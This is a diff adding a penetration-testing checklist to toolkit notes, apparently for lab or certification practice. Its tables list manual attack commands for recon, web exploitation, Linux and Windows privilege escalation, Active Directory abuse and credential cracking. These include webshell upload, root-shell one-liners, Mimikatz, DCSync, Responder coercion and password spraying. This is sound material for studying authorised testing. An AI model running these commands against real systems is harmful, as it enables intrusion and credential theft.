@@ -1111,6 +1111,109 @@ All creds auto-logged to $TOOLKIT_ROOT/creds.txt by adr.sh, crackr.sh, sprayr.sh
 
 ---
 
+## Toolkit Blind Spots — What the Scripts Don't Cover
+
+> [!warning] The 13 scripts automate the common path. This section is your manual testing checklist. If you're stuck, something you need is probably here.
+
+The table below maps each gap to its phase and the manual technique to fill it.
+
+---
+
+### Recon Gaps (`recon.sh`)
+
+| Gap | When to Check | Manual Fix |
+|-----|--------------|-----------|
+| MSSQL (1433) | Port open, no auto-enum | `nxc mssql IP -u sa -p ''` → `impacket-mssqlclient` → `xp_cmdshell` |
+| Kerberos (88) | Port open = likely DC | `kerbrute userenum --dc IP -d DOMAIN userlist.txt` |
+| IIS ShortName/TRACE | IIS on port 80, gobuster empty | `curl -X TRACE http://IP/` and run IIS ShortName Scanner |
+| WebDAV | IIS target with OPTIONS allowed | `davtest -url http://IP` then PUT a webshell |
+| SMTP RCPT TO | VRFY returns 0 users | `smtp-user-enum -M RCPT -U names.txt -t IP -p 25` |
+| NetBIOS names | Windows target, SMB open | `nmblookup -A IP` → reveals domain, workgroup, MAC |
+| UDP beyond top-200 | SNMP/TFTP not found | `sudo nmap -sU -p 161,162,500,514,623,1434 --open IP` |
+| RPC endpoint map | 135/tcp open, msrpc | `impacket-rpcdump IP` → find services on non-standard ports |
+| IPv6 | Windows target | `ip -6 neigh` → `nmap -6 -Pn --open --top-ports 100 IP6` |
+| Full DNS brute | DNS open, no domain found | `gobuster dns -d domain.local -r IP:53 -w subdomains.txt` |
+
+---
+
+### Web Gaps (`webenum.sh`)
+
+| Gap | Trigger | Manual Technique |
+|-----|---------|-----------------|
+| SQL injection | Login form, search box, any `?id=` param | `sqlmap -u URL --batch --dbs --level 3` or manual `'` test |
+| LFI | `?file=`, `?page=`, `?path=` param | `?file=../../../../etc/passwd` → log poisoning → RCE |
+| File upload bypass | Upload form present | Double-ext, Content-Type spoof, magic bytes, .phar |
+| SSTI | Input reflected back in page | `{{7*7}}` test → if 49 returned → RCE via template engine |
+| Auth bypass | Login page with no obvious vuln | Direct access, IDOR, cookie manipulation, JWT none-alg |
+| WebDAV PUT | HTTP OPTIONS shows PUT | `davtest -url http://IP` → upload ASPX/PHP webshell |
+| API endpoints | JavaScript-heavy site | Check JS source, `/swagger.json`, `/api/v1/` fuzz |
+| Git repo exposed | `.git/HEAD` returns 200 | `git-dumper http://IP/.git/ ./dump` → check commit history |
+| Sensitive files | Empty gobuster result | `.env`, `wp-config.php`, `web.config`, `.htpasswd` direct-curl |
+| HTTP verb tampering | Non-standard server | `-X TRACE`, `-X PUT`, `-X DELETE` with curl |
+
+---
+
+### Linux Privesc Gaps (`escalatr.sh` + linpeas)
+
+| Gap | Check | Manual Technique |
+|-----|-------|-----------------|
+| Wildcard injection in cron | Root cron uses `*` glob in tar/rsync/chown | Create `--checkpoint-action=exec=` filename in writable dir |
+| NFS no_root_squash | `/etc/exports` shows `no_root_squash` | Mount from Kali as root → cp bash → chmod +s → bash -p |
+| LD_PRELOAD via sudo | `sudo -l` shows `env_keep+=LD_PRELOAD` | Write malicious .so → `sudo LD_PRELOAD=/tmp/evil.so <binary>` |
+| Docker/LXD group | `id` shows docker or lxd group | `docker run -v /:/mnt alpine chroot /mnt` |
+| Internal localhost service | `ss -tlnp` shows 127.0.0.1:PORT | SSH local forward → investigate service |
+| Process env variables | Any running service | `cat /proc/*/environ 2>/dev/null \| tr '\0' '\n' \| grep -i pass` |
+| Capabilities | `getcap` returns results | `cap_setuid` → `python3 -c "import os; os.setuid(0); os.system('/bin/bash')"` |
+| PATH hijacking | Sudo script calls binary without full path | Create fake binary in writable PATH dir |
+
+---
+
+### Windows Privesc Gaps (`escalatr.sh` + winPEAS)
+
+| Gap | Check | Manual Technique |
+|-----|-------|-----------------|
+| DLL hijacking | Service loads non-existent DLL from writable dir | `icacls` on service dir → drop malicious DLL → restart service |
+| DPAPI credential blobs | User has Credentials folder | `impacket-dpapi` offline with master key + user password |
+| Scheduled tasks w/ writable scripts | `schtasks` shows SYSTEM task → writable script | Inject reverse shell → wait for trigger |
+| WDigest enabled | `reg query ... UseLogonCredential` = 1 | Mimikatz `sekurlsa::wdigest` → plaintext creds |
+| PowerShell history | Any Windows target | `type $env:APPDATA\...\ConsoleHost_history.txt` |
+| Unattend.xml left behind | Fresh build / imaging | `C:\Windows\Panther\unattend.xml` → admin password |
+| VNC stored password | VNC service running | `reg query HKCU\Software\TightVNC\Server /v Password` → DES decrypt |
+| Service config with plaintext creds | IIS app pools, service accounts | `Get-WebConfiguration ... \| Select userName,password` |
+| LAPS | Domain-joined, LAPS deployed | `nxc ldap DC_IP -u user -p pass -M laps` |
+
+---
+
+### AD Gaps (`adr.sh`)
+
+| Gap | When | Manual Technique |
+|-----|------|-----------------|
+| ADCS (certificate services) | Port 80/443 on a DC-adjacent host | `certipy find -u user@corp.local -p pass -dc-ip DC_IP` → ESC1-8 |
+| Constrained delegation | BloodHound shows no path | `impacket-findDelegation` → `impacket-getST` to impersonate admin |
+| Shadow credentials | GenericWrite on computer, no LAPS | `pywhisker.py --target COMPUTER$ --action add` |
+| Coercion (PetitPotam) | Need hash without existing creds | `sudo responder -I tun0` + `PetitPotam.py KALI DC_IP` |
+| GPO modification rights | BloodHound shows WriteGPO | `SharpGPOAbuse` → add computer task → `gpupdate /force` |
+| DCSync without DA | BloodHound shows replication rights | `impacket-secretsdump` immediately — dump everything |
+| AS-REP without creds | No initial foothold | `impacket-GetNPUsers corp.local/ -dc-ip DC_IP -usersfile names.txt -no-pass` |
+| RC4 downgrade | AES Kerberoast hash won't crack | Request ticket with `-etype 23` → RC4 is faster to crack |
+
+---
+
+### Credential / Password Gaps (`crackr.sh`, `sprayr.sh`)
+
+| Gap | When | Manual Technique |
+|-----|------|-----------------|
+| NTLMv2 from Responder | On same network segment | `sudo responder -I tun0 -dwPv` → crack with hashcat -m 5600 |
+| GPP cPassword | SYSVOL readable | `nxc smb DC_IP -M gpp_password` → `gpp-decrypt <cPassword>` |
+| DPAPI blobs | Windows foothold, user has Credentials dir | `impacket-dpapi` with backup key from DC |
+| KeePass database | Found .kdbx file | `keepass2john db.kdbx \| sed 's/^[^:]*://' > h.hash` → hashcat -m 13400 |
+| Office document password | Found .docx/.xlsx with password | `office2john doc.docx > h.hash` → hashcat -m 9600 |
+| Web form brute force | Login page, no spray hit | `hydra -l admin -P rockyou.txt IP http-post-form "/login:user=^USER^&pass=^PASS^:fail"` |
+| RDP auth | Have creds, need shell | `xfreerdp /u:user /p:pass /v:IP /cert-ignore` or `nxc rdp IP -u user -p pass` |
+| Kerberos pre-auth spray | Domain user list, cautious of lockouts | `kerbrute passwordspray --dc DC_IP -d corp.local users.txt 'Password1'` |
+
+---
+
 ## Common Mistakes Under Pressure
 
 > [!warning] DO NOT DO THESE
